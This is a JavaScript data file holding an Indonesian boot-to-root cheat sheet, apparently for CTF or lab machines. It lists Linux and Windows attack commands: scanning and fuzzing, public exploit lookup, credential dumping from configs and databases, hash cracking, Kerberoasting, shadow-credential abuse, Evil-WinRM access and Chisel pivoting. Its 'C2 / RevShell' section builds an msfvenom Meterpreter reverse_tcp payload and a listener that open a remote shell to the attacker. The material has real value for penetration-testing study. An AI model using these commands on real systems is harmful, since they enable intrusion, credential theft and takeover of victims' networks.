export const data = {
  name: "B2R",
  children: [
    {
      name: "Linux",
      children: [
        {
          name: "Foothold",
          children: [
            {
              name: "Nmap",
              content: {
                description: "Scanning service untuk cek port TCP/UDP yang terbuka di target.",
                commands: [
                  {
                    label: "TCP scan",
                    cmd: "nmap -sCV --min-rate 1000 [ip] -vv -oN scan.nmap -p-",
                  },
                  {
                    label: "UDP scan",
                    cmd: "nmap -sU --min-rate 1000 [ip] -vv -oN scan_udp.nmap -p-",
                  },
                ],
                notes: "Mulai dari TCP dulu, UDP belakangan karena lebih lambat.",
              },
            },
            {
              name: "FTP",
              content: {
                description:
                  "Cek anonymous login di FTP target. Kalau anonymous nyala, bisa langsung masuk dan download file.",
                commands: [
                  { label: "Connect", cmd: "ftp [ip] 21" },
                  { label: "List files", cmd: "ls -la" },
                  { label: "Download file", cmd: "get [namafile.ekstensi]" },
                ],
                notes:
                  "Login dengan Anonymous:Anonymous. Cek file penting dan download aja.",
              },
            },
            {
              name: "Web",
              children: [
                {
                  name: "Dir Fuzzing",
                  content: {
                    description:
                      "Fuzzing directory kalau target ada service web.",
                    commands: [
                      {
                        label: "Gobuster dir",
                        cmd: "gobuster dir -u http://[ip] -w ~/wordlists/seclists/web-content/common.txt | tee dir.txt",
                      },
                      {
                        label: "Dirsearch (fallback)",
                        cmd: "dirsearch -u http://[ip] -w ~/wordlists/seclists/web-content/common.txt",
                      },
                    ],
                    notes: "Kalau gobuster gabisa, pakai dirsearch.",
                  },
                },
                {
                  name: "Subdomain Fuzzing",
                  content: {
                    description:
                      "Fuzzing subdomain kalau web pakai domain, misal http://nasgor.jmk.",
                    commands: [
                      {
                        label: "Gobuster vhost",
                        cmd: "gobuster vhost -u nasgor.jmk -w ~/wordlists/seclists/dns/subdomains-top1million-5000.txt --append-domain | tee subdo.txt",
                      },
                      {
                        label: "FFuf",
                        cmd: 'ffuf -u "http://nasgor.jmk" -H "HOST: FUZZ.nasgor.jmk" -w ~/wordlists/seclists/dns/subdomains-top1million-5000.txt -fw 522',
                      },
                      {
                        label: "FFuf (filter false positive)",
                        cmd: 'ffuf -u "http://nasgor.jmk" -H "HOST: FUZZ.nasgor.jmk" -w ~/wordlists/seclists/dns/subdomains-top1million-5000.txt -fw [jumlah_length]',
                      },
                    ],
                    notes:
                      "Kalau response banyak (false positive), filter pakai -fw sesuai jumlah length-nya.",
                  },
                },
                {
                  name: "Check Exploit",
                  content: {
                    description:
                      "Cek versi aplikasi web lalu cari public exploit-nya.",
                    commands: [
                      {
                        label: "Searchsploit",
                        cmd: "searchsploit [nama_app] [versi]",
                      },
                      {
                        label: "MSF search",
                        cmd: "msfconsole\nsearch [nama_app] [versi]",
                      },
                      {
                        label: "Public POC",
                        cmd: "cari aja disini lalu ctrl + f cari CVE berapa sesuai tahun: https://github.com/ycdxsb/PocOrExp_in_Github",
                      }
                    ],
                    notes:
                      "Cek versi di source code browser (Ctrl+U), lalu cari di Google / ExploitDB / GitHub dengan keyword: [nama_app] [versi] exploit, atau kalau mau jadi script kiddie sepertiku bisa langsung pakai public POC di opsi 3",
                  },
                },
              ],
            },
          ],
        },
        {
          name: "PrivEsc",
          children: [
            {
              name: "Low Hanging Fruit",
              content: {
                description: "Cek hal-hal basic yang sering kelewat.",
                commands: [
                  { label: "Cek environment vars", cmd: "env" },
                  { label: "Bash history", cmd: "cat ~/.bash_history" },
                  { label: "Cek groups", cmd: "id" },
                ],
                notes:
                  "Cek groups juga, kali aja ada docker group dan bisa escape.",
              },
            },
            {
              name: "Credential Enum",
              content: {
                description:
                  "Enum credential dari file config, database, atau log service.",
                commands: [
                  {
                    label: "Grep password dari config",
                    cmd: "cat config.php | grep password",
                  },
                  { label: "Cek tipe file DB", cmd: "file data.db" },
                  {
                    label: "SQLite3 dump",
                    cmd: "sqlite3 data.db\n.tables\nselect * from users;",
                  },
                  {
                    label: "MySQL blank password",
                    cmd: "mysql -u root -p",
                  },
                  {
                    label: "Cek log service",
                    cmd: "ps aux | grep [service]",
                  },
                ],
                notes:
                  "Cek file config dan DB dulu. Kalau hash ketemu, coba crackstation.net dulu sebelum john/hashcat.",
              },
            },
            {
              name: "Cracking",
              content: {
                description: "Crack password hash yang ditemukan.",
                commands: [
                  {
                    label: "John",
                    cmd: "john hash /file/ke/rockyou.txt",
                  },
                  {
                    label: "Hashcat identify",
                    cmd: "hashcat --identify 'hash'",
                  },
                  {
                    label: "Hashcat crack",
                    cmd: "hashcat -m [mode] hash /file/ke/rockyou.txt",
                  },
                ],
                notes:
                  "Coba https://crackstation.net dulu, lebih cepat. Baru john/hashcat kalau gabisa.",
              },
            },
            {
              name: "Sudo",
              content: {
                description: "Cek sudo permission yang bisa dieksploitasi.",
                commands: [{ label: "Check sudo", cmd: "sudo -l" }],
                notes:
                  "Lihat binary apa yang bisa dijalankan tanpa password, cek di GTFOBins.",
              },
            },
            {
              name: "Cron",
              content: {
                description: "Cek scheduled task yang mungkin bisa dieksploitasi.",
                commands: [
                  { label: "Cek crontab", cmd: "cat /etc/crontab" },
                  {
                    label: "Cek writable di /etc",
                    cmd: "find /etc -writable 2>/dev/null",
                  },
                  {
                    label: "Cek incron",
                    cmd: "cat /etc/incron.d/*",
                  },
                ],
                notes:
                  "Combine dengan incron kalau ada. Cek file yang di-execute cron apakah writable.",
              },
            },
            {
              name: "Pivoting",
              content: {
                description:
                  "Port forwarding untuk akses internal service yang tidak expose ke luar.",
                commands: [
                  {
                    label: "Cek internal service",
                    cmd: "netstat -tulnp | grep 127.0.0.1",
                  },
                  {
                    label: "Curl cek service",
                    cmd: "curl 127.0.0.1:[port]",
                  },
                  {
                    label: "SSH port forwarding",
                    cmd: "ssh -L [local_port]:127.0.0.1:[remote_port] [user]@[ip]",
                  },
                  {
                    label: "Chisel server (attacker)",
                    cmd: "./chisel server -p 8000 --reverse",
                  },
                  {
                    label: "Chisel client (victim)",
                    cmd: "./chisel client [attacker_ip]:8000 R:[port1]:127.0.0.1:[port1] R:[port2]:127.0.0.1:[port2]",
                  },
                ],
                notes:
                  "SSH forwarding kalau tau password / ada id_rsa. Chisel kalau perlu forward multiple port sekaligus.",
              },
            },
          ],
        },
      ],
    },
    {
      name: "Windows",
      children: [
        {
          name: "Foothold",
          children: [
            {
              name: "Nmap",
              content: {
                description:
                  "Scanning service untuk cek port TCP/UDP. Windows kadang perlu flag -Pn kalau tidak bisa di-ping.",
                commands: [
                  {
                    label: "TCP scan",
                    cmd: "nmap -sCV --min-rate 1000 [ip] -vv -oN scan.nmap -p-",
                  },
                  {
                    label: "UDP scan",
                    cmd: "nmap -sU --min-rate 1000 [ip] -vv -oN scan_udp.nmap -p-",
                  },
                  {
                    label: "Skip ping (kalau gabisa di-ping)",
                    cmd: "nmap -sCV --min-rate 1000 [ip] -vv -oN scan.nmap -p- -Pn",
                  },
                ],
                notes:
                  "Windows sering block ICMP ping, pakai -Pn kalau nmap bilang host down.",
              },
            },
            {
              name: "FTP",
              content: {
                description:
                  "Cek anonymous login di FTP target. Kalau anonymous nyala, bisa langsung masuk.",
                commands: [
                  { label: "Connect", cmd: "ftp [ip] 21" },
                  { label: "Download file", cmd: "get [namafile.ekstensi]" },
                ],
                notes: "Login dengan Anonymous:Anonymous.",
              },
            },
            {
              name: "SMB",
              content: {
                description:
                  "Cek SMB share tanpa credentials (null session) atau dengan credentials.",
                commands: [
                  {
                    label: "NXC SMB check",
                    cmd: "nxc smb [ip] --verbose",
                  },
                  {
                    label: "NXC null session",
                    cmd: "nxc smb [ip] -u '' -p '' --shares --verbose",
                  },
                  {
                    label: "NXC guest session",
                    cmd: "nxc smb [ip] -u ' ' -p '' --shares --verbose",
                  },
                  {
                    label: "SMBclient list shares",
                    cmd: "smbclient -L \\\\[ip]",
                  },
                  {
                    label: "SMBclient connect share",
                    cmd: "smbclient \\\\\\\\[ip]\\\\[sharename]",
                  },
                  {
                    label: "Download file",
                    cmd: "get [namafile.ekstensi]",
                  },
                ],
                notes:
                  "Coba null session dulu, kalau gagal coba guest (' ' dengan spasi).",
              },
            },
            {
              name: "LDAP",
              content: {
                description:
                  "Enum LDAP kalau dapat credentials. Bisa pakai nxc, bloodhound, atau ldapsearch.",
                commands: [
                  {
                    label: "NXC LDAP check",
                    cmd: "nxc ldap [ip] -u '[user]' -p '[pass]'",
                  },
                  {
                    label: "NXC enum users",
                    cmd: "nxc ldap [ip] -u '[user]' -p '[pass]' --users",
                  },
                  {
                    label: "NXC enum computers",
                    cmd: "nxc ldap [ip] -u '[user]' -p '[pass]' --computers",
                  },
                  {
                    label: "Bloodhound collect",
                    cmd: "bloodhound-python -u [user] -p '[pass]' -d [domain] -ns [ip] -c all",
                  },
                  {
                    label: "LDAPsearch (cek field info)",
                    cmd: 'ldapsearch -x -H ldap://[ip] -D \'[domain]\\[user]\' -w \'[pass]\' -b "DC=[domain],DC=[tld]" "(sAMAccountName=[user])"',
                  },
                ],
                notes:
                  "Kalau nxc ijo, langsung lanjut ke bloodhound. LDAPsearch berguna untuk cari field yang susah ditemukan di bloodhound.",
              },
            },
            {
              name: "Web",
              children: [
                {
                  name: "Dir Fuzzing",
                  content: {
                    description:
                      "Fuzzing directory kalau target ada service web.",
                    commands: [
                      {
                        label: "Gobuster dir",
                        cmd: "gobuster dir -u http://[ip] -w ~/wordlists/seclists/web-content/common.txt | tee dir.txt",
                      },
                      {
                        label: "Dirsearch (fallback)",
                        cmd: "dirsearch -u http://[ip] -w ~/wordlists/seclists/web-content/common.txt",
                      },
                    ],
                    notes: "Kalau gobuster gabisa, pakai dirsearch.",
                  },
                },
                {
                  name: "Subdomain Fuzzing",
                  content: {
                    description: "Fuzzing subdomain kalau web pakai domain.",
                    commands: [
                      {
                        label: "Gobuster vhost",
                        cmd: "gobuster vhost -u nasgor.jmk -w ~/wordlists/seclists/dns/subdomains-top1million-5000.txt --append-domain | tee subdo.txt",
                      },
                      {
                        label: "FFuf",
                        cmd: 'ffuf -u "http://nasgor.jmk" -H "HOST: FUZZ.nasgor.jmk" -w ~/wordlists/seclists/dns/subdomains-top1million-5000.txt -fw 522',
                      },
                    ],
                    notes:
                      "Kalau false positive banyak, filter dengan -fw sesuai length.",
                  },
                },
                {
                  name: "Check Exploit",
                  content: {
                    description:
                      "Cek versi aplikasi web lalu cari public exploit-nya.",
                    commands: [
                      {
                        label: "Searchsploit",
                        cmd: "searchsploit [nama_app] [versi]",
                      },
                      {
                        label: "MSF search",
                        cmd: "msfconsole\nsearch [nama_app] [versi]",
                      },
                    ],
                    notes:
                      "Cek versi di Ctrl+U browser, cari di Google / ExploitDB / GitHub.",
                  },
                },
              ],
            },
            {
              name: "Kerberoasting",
              content: {
                description:
                  "Request TGS untuk service account lalu crack offline. Perlu sync waktu dulu.",
                commands: [
                  {
                    label: "Sync time (ntpdate)",
                    cmd: "sudo ntpdate [ip]",
                  },
                  {
                    label: "Sync time (faketime)",
                    cmd: 'faketime "$(ntpdate -q [ip] | cut -d \' \' -f 1,2)"',
                  },
                  {
                    label: "GetUserSPNs",
                    cmd: "impacket-GetUserSPNs [domain]/[user]:[pass] -dc-ip [ip] -request",
                  },
                  {
                    label: "Hashcat crack TGS",
                    cmd: "hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt",
                  },
                  {
                    label: "Rubeus TGT delegate",
                    cmd: ".\\Rubeus.exe tgtdeleg /nowrap",
                  },
                  {
                    label: "Convert kirbi ke ccache",
                    cmd: "impacket-ticketConverter output.kirbi output.ccache",
                  },
                ],
                notes:
                  "Kalau ntpdate di-block, pakai faketime. Rubeus dari SharpCollection (NetFramework_4.7_x64) tanpa perlu build.",
              },
            },
            {
              name: "WinRM",
              content: {
                description:
                  "Akses remote shell via WinRM kalau ada credentials atau NTLM hash.",
                commands: [
                  {
                    label: "Evil-WinRM password",
                    cmd: "evil-winrm -i [ip] -u '[user]' -p '[pass]'",
                  },
                  {
                    label: "Evil-WinRM NTLM hash",
                    cmd: "evil-winrm -i [ip] -u '[user]' -H '[ntlm_hash]'",
                  },
                ],
                notes: "Port WinRM default: 5985 (HTTP) atau 5986 (HTTPS).",
              },
            },
            {
              name: "Shadow Creds",
              content: {
                description:
                  "Abuse Key Credentials Link kalau ada GenericWrite ke user/computer tertentu.",
                commands: [
                  {
                    label: "Certipy shadow auto (pakai TGT)",
                    cmd: "faketime \"$(ntpdate -q [ip] | cut -d ' ' -f 1,2)\" certipy-ad shadow auto -k -account [acc]$ -dc-ip [ip] -dc-host DC01.[domain] -target DC01.[domain]",
                  },
                ],
                notes:
                  "Cek dulu di Bloodhound apakah ada GenericWrite. Bisa ke user atau computer account.",
              },
            },
            {
              name: "C2 / RevShell",
              content: {
                description:
                  "Bikin Meterpreter shell yang lebih stabil dibanding reverse shell biasa.",
                commands: [
                  {
                    label: "Generate payload",
                    cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f exe -o shell.exe",
                  },
                  {
                    label: "Setup listener",
                    cmd: 'msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST [ip]; set LPORT [port]; run"',
                  },
                  {
                    label: "Run di target",
                    cmd: ".\\shell.exe",
                  },
                ],
                notes:
                  "Upload shell.exe ke target dulu, baru run. Meterpreter jauh lebih nyaman untuk post-exploitation.",
              },
            },
          ],
        },
        {
          name: "PrivEsc",
          children: [
            {
              name: "Enum Privilege",
              content: {
                description:
                  "Cek privilege dan group yang dimiliki user saat ini.",
                commands: [
                  { label: "Whoami full", cmd: "whoami /all" },
                  { label: "Cek privilege", cmd: "whoami /priv" },
                ],
                notes:
                  "Cek ada SeImpersonatePrivilege atau enggak. Kalau ada, bisa potato attack.",
              },
            },
            {
              name: "AD Data",
              content: {
                description:
                  "Kumpulkan data Active Directory pakai SharpHound lalu analisis di Bloodhound.",
                commands: [
                  {
                    label: "Upload SharpHound (evil-winrm)",
                    cmd: "upload SharpHound.ps1 .",
                  },
                  {
                    label: "Download SharpHound",
                    cmd: "curl [ip]:[port]/SharpHound.ps1 -O SharpHound.ps1",
                  },
                  {
                    label: "Run SharpHound",
                    cmd: "Import-Module .\\SharpHound.ps1\nInvoke-BloodHound -CollectionMethod All",
                  },
                  {
                    label: "Download hasil (evil-winrm)",
                    cmd: "download 20260209123721_mesin.zip /home/[user]/path/mesin.zip",
                  },
                ],
                notes:
                  "Drag zip ke Bloodhound UI untuk analisis. Cari path dari user ke Domain Admin.",
              },
            },
            {
              name: "Pivoting",
              content: {
                description:
                  "Port forwarding untuk akses internal service yang tidak expose ke luar.",
                commands: [
                  {
                    label: "Cek internal service",
                    cmd: 'netstat -ano | findstr "LISTENING"',
                  },
                  {
                    label: "SSH port forwarding",
                    cmd: "ssh -L [local_port]:127.0.0.1:[remote_port] [user]@[ip]",
                  },
                  {
                    label: "Chisel server (attacker)",
                    cmd: "./chisel server -p 8000 --reverse",
                  },
                  {
                    label: "Chisel client (victim)",
                    cmd: ".\\chisel.exe client [attacker_ip]:8000 R:[port1]:127.0.0.1:[port1] R:[port2]:127.0.0.1:[port2]",
                  },
                ],
                notes:
                  "Di Windows pakai netstat -ano bukan tulnp. Chisel kalau perlu forward multiple port.",
              },
            },
          ],
        },
      ],
    },
  ],
};